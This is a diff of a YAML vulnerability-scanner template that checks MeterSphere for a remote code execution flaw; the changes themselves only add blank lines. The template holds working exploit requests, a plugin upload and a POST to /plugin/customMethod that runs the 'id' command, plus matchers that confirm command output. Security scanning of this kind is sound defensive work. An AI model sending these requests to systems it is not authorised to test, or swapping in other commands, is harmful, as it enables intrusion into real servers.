@@ -1,4 +1,5 @@
 id: metersphere-plugin-rce
+
 info:
   name: MeterSphere - Remote Code Execution
   author: pdteam,y4er
@@ -13,6 +14,7 @@ info:
     cvss-score: 10.0
     cwe-id: CWE-77
   tags: metersphere,rce,intrusive
+
 requests:
   - raw:
       - |
@@ -32,6 +34,7 @@ requests:
 
         null
         ------WebKitFormBoundaryreButJNjkCniQExX--
+
       - |
         POST /plugin/customMethod HTTP/1.1
         Host: {{Hostname}}
@@ -39,6 +42,7 @@ requests:
         Content-Type: application/json
 
         {"entry":"Evil","request":"id"}
+
     matchers-condition: and
     matchers:
       - type: word
@@ -47,12 +51,15 @@ requests:
           - '"data":'
           - '"success":true'
         condition: and
+
       - type: regex
         regex:
           - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+
       - type: status
         status:
           - 200
+
     extractors:
       - type: regex
         regex:
